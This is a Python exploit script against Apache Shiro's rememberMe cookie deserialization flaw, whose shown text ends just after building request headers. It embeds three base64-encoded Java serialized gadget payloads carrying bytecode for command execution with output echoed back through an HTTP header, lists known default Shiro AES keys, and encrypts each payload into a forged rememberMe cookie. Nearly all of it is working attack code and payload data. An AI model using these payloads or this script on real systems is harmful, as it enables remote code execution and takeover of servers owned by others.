import sys,base64,uuid
from Crypto.Cipher import AES
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()


def encode_rememberme(url):
    # https://github.com/zema1/ysoserial
    # java -jar ysoserial.jar CommonsCollectionsK1TomcatEcho  a | base64
    CommonsBeanutils1 = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAAdvK/rq+AAAAMwAcAQAdeXNvc2VyaWFsL1B3bmVyMzUyODEyOTE3MTU0MDAHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAGFB3bmVyMzUyODEyOTE3MTU0MDAuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAAFhCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAA1TdGFja01hcFRhYmxlAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFwEABjxpbml0PgwAGQAICgAYABoAIQACABgAAAAAAAIACAAHAAgAAQAJAAAAJAADAAIAAAAPpwADAUy4AA8SEbYAFVexAAAAAQAWAAAAAwABAwABABkACAABAAkAAAARAAEAAQAAAAUqtwAbsQAAAAAAAQAFAAAAAgAGdXEAfgAQAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC4ADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhxAH4ADXg="
    CommonsCollectionsK1 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPlMr+ur4AAAAzAOsBAB15c29zZXJpYWwvUHduZXIzNDY4NDQwODQzNTEwMAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAYUHduZXIzNDY4NDQwODQzNTEwMC5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HADYBABNqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADwBAARDb2RlAQAKRXhjZXB0aW9ucwEAE2phdmEvbGFuZy9FeGNlcHRpb24HAEABAA1TdGFja01hcFRhYmxlAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAEUARgoADABHAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwBJAQANZ2V0U3VwZXJjbGFzcwwASwAuCgAMAEwBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMACMATgoASgBPAQAiamF2YS9sYW5nL3JlZmxlY3QvQWNjZXNzaWJsZU9iamVjdAcAUQEADXNldEFjY2Vzc2libGUBAAQoWilWDABTAFQKAFIAVQEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwBXAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFkAWgoAWABbAQAQamF2YS9sYW5nL1N0cmluZwcAXQEAAygpVgwAIwBfCgAEAGABABBqYXZhL2xhbmcvVGhyZWFkBwBiAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DABkAGUKAGMAZgEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwwAaABpCgBjAGoBAAd0aHJlYWRzCABsDABDAEQKAAIAbgEAE1tMamF2YS9sYW5nL1RocmVhZDsHAHABAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAHIAcwoAYwB0AQAEZXhlYwgAdgEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAB4AHkKAF4AegEABGh0dHAIAHwBAAZ0YXJnZXQIAH4BABJqYXZhL2xhbmcvUnVubmFibGUHAIABAAZ0aGlzJDAIAIIBAAdoYW5kbGVyCACEAQAGZ2xvYmFsCACGAQAKcHJvY2Vzc29ycwgAiAEADmphdmEvdXRpbC9MaXN0BwCKAQAEc2l6ZQEAAygpSQwAjACNCwCLAI4BABUoSSlMamF2YS9sYW5nL09iamVjdDsMAFkAkAsAiwCRAQADcmVxCACTAQALZ2V0UmVzcG9uc2UIAJUBAAlnZXRIZWFkZXIIAJcBAAhUZXN0ZWNobwgAmQEAB2lzRW1wdHkBAAMoKVoMAJsAnAoAXgCdAQAJc2V0U3RhdHVzCACfAQAJYWRkSGVhZGVyCAChAQAHVGVzdGNtZAgAowEAB29zLm5hbWUIAKUBABBqYXZhL2xhbmcvU3lzdGVtBwCnAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAqQCqCgCoAKsBAAt0b0xvd2VyQ2FzZQwArQBzCgBeAK4BAAZ3aW5kb3cIALABAAdjbWQuZXhlCACyAQACL2MIALQBAAcvYmluL3NoCAC2AQACLWMIALgBABFqYXZhL3V0aWwvU2Nhbm5lcgcAugEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAvAEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMACMAvgoAvQC/AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMAMEAwgoAvQDDAQARamF2YS9sYW5nL1Byb2Nlc3MHAMUBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DADHAMgKAMYAyQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAIwDLCgC7AMwBAAJcQQgAzgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwA0ADRCgC7ANIBAARuZXh0DADUAHMKALsA1QEACGdldEJ5dGVzAQAEKClbQgwA1wDYCgBeANkMAAcACAoAAgDbAQANZ2V0UHJvcGVydGllcwEAGCgpTGphdmEvdXRpbC9Qcm9wZXJ0aWVzOwwA3QDeCgCoAN8BABNqYXZhL3V0aWwvSGFzaHRhYmxlBwDhAQAIdG9TdHJpbmcMAOMAcwoA4gDkAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcA5gEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAOgKAOkAYAAhAAIA6QAAAAAAAwAKAAcACAACAD4AAAEvAAgABQAAAPYSCrgAEE4ttgAUTS0SFga9AAxZAxIYU1kEsgAeU1kFsgAeU7YAIiwGvQAEWQMrU1kEuwAaWQO3ACZTWQW7ABpZK763ACZTtgAsVyq2ADASMgS9AAxZAy1TtgA1KgS9AARZAyxTtgAsV6cAjToEEjm4ABBOLRI7BL0ADFkDEhhTtgAiLQS9AARZAytTtgAsTSq2ADASMgS9AAxZAy1TtgA1KgS9AARZAyxTtgAsV6cASDoEEjm4ABBOLRI7BL0ADFkDEhhTtgAiLQS9AARZAytTtgAsTSq2ADASMgS9AAxZAy1TtgA1KgS9AARZAyxTtgAsV6cAA7EAAgAAAGgAawA3AAAAaACwAD0AAQBCAAAAFwAD9wBrBwA39wBEBwA9/QBEBwAEBwAMAD8AAAAEAAEAQQAKAEMARAACAD4AAAB+AAMABQAAAD8BTSq2ADBOpwAZLSu2AEhNpwAWpwAAOgQttgBNTqcAAy0SBKb/5ywBpgAMuwBKWSu3AFC/LAS2AFYsKrYAXLAAAQAKABMAFgBKAAEAQgAAACUABv0ACgcAWAcADAj/AAIABAcABAcAXgcAWAcADAABBwBKCQUNAD8AAAAEAAEAQQABACMAXwACAD4AAAM2AAgADQAAAj8qtwDqAzYEuABntgBrEm24AG/AAHE6BQM2BhUGGQW+ogIfGQUVBjI6BxkHAaYABqcCCRkHtgB1Ti0Sd7YAe5oADC0SfbYAe5oABqcB7hkHEn+4AG9MK8EAgZoABqcB3CsSg7gAbxKFuABvEoe4AG9MpwALOginAcOnAAArEom4AG/AAIs6CQM2ChUKGQm5AI8BAKIBnhkJFQq5AJICADoLGQsSlLgAb0wrtgAwEpYDvQAMtgA1KwO9AAS2ACxNK7YAMBKYBL0ADFkDEl5TtgA1KwS9AARZAxKaU7YALMAAXk4tAaUACi22AJ6ZAAanAFgstgAwEqAEvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy2ADASogW9AAxZAxJeU1kEEl5TtgA1LAW9AARZAxKaU1kELVO2ACxXBDYEK7YAMBKYBL0ADFkDEl5TtgA1KwS9AARZAxKkU7YALMAAXk4tAaUACi22AJ6ZAAanAI0stgAwEqAEvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKmuACstgCvErG2AHuZABgGvQBeWQMSs1NZBBK1U1kFLVOnABUGvQBeWQMSt1NZBBK5U1kFLVM6DCy7ALtZuwC9WRkMtwDAtgDEtgDKtwDNEs+2ANO2ANa2ANq4ANwENgQtAaUACi22AJ6ZAAgVBJoABqcAECy4AOC2AOW2ANq4ANwVBJkABqcACYQKAaf+XBUEmQAGpwAJhAYBp/3fsQABAF8AcABzAEEAAQBCAAAA3QAZ/wAaAAcHAAIAAAABBwBxAQAA/AAXBwBj/wAXAAgHAAIAAAcAXgEHAHEBBwBjAAAC/wARAAgHAAIHAAQABwBeAQcAcQEHAGMAAFMHAEEE/wACAAgHAAIHAAQABwBeAQcAcQEHAGMAAP4ADQAHAIsB/wBjAAwHAAIHAAQHAAQHAF4BBwBxAQcAYwAHAIsBBwAEAAAC+wBULgL7AE1RBwDnKQsEAgwH/wAFAAsHAAIHAAQABwBeAQcAcQEHAGMABwCLAQAA/wAHAAgHAAIAAAABBwBxAQcAYwAA+gAFAD8AAAAEAAEAQQABAAUAAAACAAZwdAAEUHducnB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ACVsAC2lQYXJhbVR5cGVzcQB+AAh4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg="
    CommonsCollectionsK2 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAD5TK/rq+AAAAMwDrAQAdeXNvc2VyaWFsL1B3bmVyMzQ5NDc5Nzc5OTM1OTkHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAGFB3bmVyMzQ5NDc5Nzc5OTM1OTkuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwA2AQATamF2YS5uaW8uQnl0ZUJ1ZmZlcggAOAEABHdyYXAIADoBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwA8AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwBAAQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABFAEYKAAwARwEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcASQEADWdldFN1cGVyY2xhc3MMAEsALgoADABMAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAE4KAEoATwEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAFEBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUwBUCgBSAFUBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABZAFoKAFgAWwEAEGphdmEvbGFuZy9TdHJpbmcHAF0BAAMoKVYMACMAXwoABABgAQAQamF2YS9sYW5nL1RocmVhZAcAYgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAZABlCgBjAGYBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGgAaQoAYwBqAQAHdGhyZWFkcwgAbAwAQwBECgACAG4BABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBwAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAByAHMKAGMAdAEABGV4ZWMIAHYBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAeAB5CgBeAHoBAARodHRwCAB8AQAGdGFyZ2V0CAB+AQASamF2YS9sYW5nL1J1bm5hYmxlBwCAAQAGdGhpcyQwCACCAQAHaGFuZGxlcggAhAEABmdsb2JhbAgAhgEACnByb2Nlc3NvcnMIAIgBAA5qYXZhL3V0aWwvTGlzdAcAigEABHNpemUBAAMoKUkMAIwAjQsAiwCOAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABZAJALAIsAkQEAA3JlcQgAkwEAC2dldFJlc3BvbnNlCACVAQAJZ2V0SGVhZGVyCACXAQAIVGVzdGVjaG8IAJkBAAdpc0VtcHR5AQADKClaDACbAJwKAF4AnQEACXNldFN0YXR1cwgAnwEACWFkZEhlYWRlcggAoQEAB1Rlc3RjbWQIAKMBAAdvcy5uYW1lCAClAQAQamF2YS9sYW5nL1N5c3RlbQcApwEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKkAqgoAqACrAQALdG9Mb3dlckNhc2UMAK0AcwoAXgCuAQAGd2luZG93CACwAQAHY21kLmV4ZQgAsgEAAi9jCAC0AQAHL2Jpbi9zaAgAtgEAAi1jCAC4AQARamF2YS91dGlsL1NjYW5uZXIHALoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALwBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjAL4KAL0AvwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DADBAMIKAL0AwwEAEWphdmEvbGFuZy9Qcm9jZXNzBwDFAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxwDICgDGAMkBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAywoAuwDMAQACXEEIAM4BAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMANAA0QoAuwDSAQAEbmV4dAwA1ABzCgC7ANUBAAhnZXRCeXRlcwEABCgpW0IMANcA2AoAXgDZDAAHAAgKAAIA2wEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMAN0A3goAqADfAQATamF2YS91dGlsL0hhc2h0YWJsZQcA4QEACHRvU3RyaW5nDADjAHMKAOIA5AEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDoCgDpAGAAIQACAOkAAAAAAAMACgAHAAgAAgA+AAABLwAIAAUAAAD2Egq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAI06BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAIAAABoAGsANwAAAGgAsAA9AAEAQgAAABcAA/cAawcAN/cARAcAPf0ARAcABAcADAA/AAAABAABAEEACgBDAEQAAgA+AAAAfgADAAUAAAA/AU0qtgAwTqcAGS0rtgBITacAFqcAADoELbYATU6nAAMtEgSm/+csAaYADLsASlkrtwBQvywEtgBWLCq2AFywAAEACgATABYASgABAEIAAAAlAAb9AAoHAFgHAAwI/wACAAQHAAQHAF4HAFgHAAwAAQcASgkFDQA/AAAABAABAEEAAQAjAF8AAgA+AAADNgAIAA0AAAI/KrcA6gM2BLgAZ7YAaxJtuABvwABxOgUDNgYVBhkFvqICHxkFFQYyOgcZBwGmAAanAgkZB7YAdU4tEne2AHuaAAwtEn22AHuaAAanAe4ZBxJ/uABvTCvBAIGaAAanAdwrEoO4AG8ShbgAbxKHuABvTKcACzoIpwHDpwAAKxKJuABvwACLOgkDNgoVChkJuQCPAQCiAZ4ZCRUKuQCSAgA6CxkLEpS4AG9MK7YAMBKWA70ADLYANSsDvQAEtgAsTSu2ADASmAS9AAxZAxJeU7YANSsEvQAEWQMSmlO2ACzAAF5OLQGlAAottgCemQAGpwBYLLYAMBKgBL0ADFkDsgAeU7YANSwEvQAEWQO7ABpZEQDItwAmU7YALFcstgAwEqIFvQAMWQMSXlNZBBJeU7YANSwFvQAEWQMSmlNZBC1TtgAsVwQ2BCu2ADASmAS9AAxZAxJeU7YANSsEvQAEWQMSpFO2ACzAAF5OLQGlAAottgCemQAGpwCNLLYAMBKgBL0ADFkDsgAeU7YANSwEvQAEWQO7ABpZEQDItwAmU7YALFcSprgArLYArxKxtgB7mQAYBr0AXlkDErNTWQQStVNZBS1TpwAVBr0AXlkDErdTWQQSuVNZBS1TOgwsuwC7WbsAvVkZDLcAwLYAxLYAyrcAzRLPtgDTtgDWtgDauADcBDYELQGlAAottgCemQAIFQSaAAanABAsuADgtgDltgDauADcFQSZAAanAAmECgGn/lwVBJkABqcACYQGAaf937EAAQBfAHAAcwBBAAEAQgAAAN0AGf8AGgAHBwACAAAAAQcAcQEAAPwAFwcAY/8AFwAIBwACAAAHAF4BBwBxAQcAYwAAAv8AEQAIBwACBwAEAAcAXgEHAHEBBwBjAABTBwBBBP8AAgAIBwACBwAEAAcAXgEHAHEBBwBjAAD+AA0ABwCLAf8AYwAMBwACBwAEBwAEBwBeAQcAcQEHAGMABwCLAQcABAAAAvsAVC4C+wBNUQcA5ykLBAIMB/8ABQALBwACBwAEAAcAXgEHAHEBBwBjAAcAiwEAAP8ABwAIBwACAAAAAQcAcQEHAGMAAPoABQA/AAAABAABAEEAAQAFAAAAAgAGcHQABFB3bnJwdwEAeHNyACtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0Lm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAtTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9uczQvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAlbAAtpUGFyYW1UeXBlc3EAfgAIeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAAXR4"
    payloads = [CommonsCollectionsK1,CommonsBeanutils1,CommonsCollectionsK2]
    keys_list = ['kPH+bIxk5D2deZiIxcaaaA==', 'Z3VucwAAAAAAAAAAAAAAAA==', 'fCq+/xW488hMTCD+cmJ3aQ==', '4AvVhmFLUs0KTA3Kprsdag==']
    isvuln = False
    for key in keys_list:
        if isvuln == True:
            break
        for i, payload in enumerate(payloads):
            if i == 1:
                Gadget = "CommonsBeanutils1"
            if i == 2:
                Gadget = "CommonsCollectionsK2"
            else:
                Gadget = "CommonsCollectionsK1"
            BS   = AES.block_size
            pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
            mode =  AES.MODE_CBC
            iv   =  uuid.uuid4().bytes
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            file_body= pad(base64.b64decode(payload))
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
    
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
                "Cookie": "rememberMe=%s" % base64_ciphertext,
                "Testecho":"1"
            }

